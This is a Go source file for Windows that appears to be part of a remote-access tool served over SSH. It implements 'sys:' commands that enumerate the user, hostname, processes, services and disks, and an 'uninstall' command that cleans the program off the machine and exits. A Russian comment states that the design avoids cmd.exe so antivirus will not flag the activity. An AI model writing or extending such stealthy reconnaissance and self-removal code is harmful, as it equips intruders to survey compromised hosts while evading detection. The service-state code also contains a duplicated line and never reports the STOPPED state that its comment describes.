//go:build windows

package main

// Нативная диагностика через Win32 API (без cmd.exe и спавнов): префикс
// "sys:" в exec-команде. Для антивируса это внутренняя работа программы.
//
//	sys:whoami  — DOMAIN\user
//	sys:hostname — имя машины
//	sys:procs   — PID и имя каждого процесса
//	sys:svcs    — службы и состояния (RUNNING/STOPPED/...)
//	sys:disks   — свободно/всего по логическим дискам

import (
	"fmt"
	"os"
	"unsafe"

	ssh "github.com/gliderlabs/ssh"
	"golang.org/x/sys/windows"
)

type svcEntry struct {
	name, disp string
	running    bool
}

// listServices: службы Win32 через EnumServicesStatusExW.
func listServices() []svcEntry {
	mgr, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_ENUMERATE_SERVICE)
	if err != nil {
		return nil
	}
	defer windows.CloseServiceHandle(mgr)
	var needed, returned, resume uint32
	_ = windows.EnumServicesStatusEx(mgr, windows.SC_STATUS_PROCESS_INFO,
		windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, nil, 0, &needed, &returned, &resume, nil)
	if needed == 0 {
		return nil
	}
	buf := make([]byte, needed)
	if err := windows.EnumServicesStatusEx(mgr, windows.SC_STATUS_PROCESS_INFO,
		windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, &buf[0], needed, &needed, &returned, &resume, nil); err != nil {
		return nil
	}
	entries := (*[1024]windows.ENUM_SERVICE_STATUS_PROCESS)(unsafe.Pointer(&buf[0]))[:returned:returned]
	var out []svcEntry
	for i := range entries {
		out = append(out, svcEntry{
			name:    windows.UTF16PtrToString(entries[i].ServiceName),
			disp:    windows.UTF16PtrToString(entries[i].DisplayName),
			running: entries[i].ServiceStatusProcess.CurrentState == windows.SERVICE_RUNNING,
		})
	}
	return out
}

// nativeMemoryLoadTotal: GlobalMemoryStatusEx (в x/sys нет обёртки).
func nativeMemoryLoadTotal() (ms memoryStatusEx) {
	ms.Length = uint32(unsafe.Sizeof(ms))
	procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&ms)))
	return ms
}

func nativeMemoryLoad() int {
	return int(nativeMemoryLoadTotal().MemoryLoad)
}

var procGlobalMemoryStatusEx = windows.NewLazySystemDLL("kernel32.dll").NewProc("GlobalMemoryStatusEx")

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

func sysNative(s ssh.Session, sub string) bool {
	switch sub {
	case "whoami":
		fmt.Fprintf(s, "%s\\%s\n", os.Getenv("USERDOMAIN"), os.Getenv("USERNAME"))
	case "hostname":
		h, _ := os.Hostname()
		fmt.Fprintln(s, h)
	case "procs":
		snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
		if err != nil {
			fmt.Fprintf(s, "sys: %v\n", err)
			return true
		}
		defer windows.CloseHandle(snap)
		var pe windows.ProcessEntry32
		pe.Size = uint32(unsafe.Sizeof(pe))
		if err := windows.Process32First(snap, &pe); err != nil {
			fmt.Fprintf(s, "sys: %v\n", err)
			return true
		}
		for {
			fmt.Fprintf(s, "%d %s\n", pe.ProcessID, windows.UTF16ToString(pe.ExeFile[:]))
			if err := windows.Process32Next(snap, &pe); err != nil {
				break
			}
		}
	case "svcs":
		for _, svc := range listServices() {
			state := "UNKNOWN"
			state = "UNKNOWN"
			if svc.running {
				state = "RUNNING"
			}
			fmt.Fprintf(s, "%s %s %s\n", svc.name, state, svc.disp)
		}
	case "disks":
		bits, _ := windows.GetLogicalDrives()
		for d := 0; d < 26; d++ {
			if bits&(1<<uint(d)) == 0 {
				continue
			}
			root, _ := windows.UTF16PtrFromString(string(rune('A'+d)) + ":\\")
			var free, total, totalFree uint64
			if err := windows.GetDiskFreeSpaceEx(root, &free, &total, &totalFree); err != nil {
				continue
			}
			gb := func(b uint64) string {
				return fmt.Sprintf("%.1fGB", float64(b)/(1<<30))
			}
			fmt.Fprintf(s, "%s free=%s total=%s\n", string(rune('A'+d)), gb(free), gb(total))
		}
	case "uninstall":
		selfCleanAndExit()
		s.Exit(0)
		return true
	default:
		return false
	}
	s.Exit(0)
	return true
}
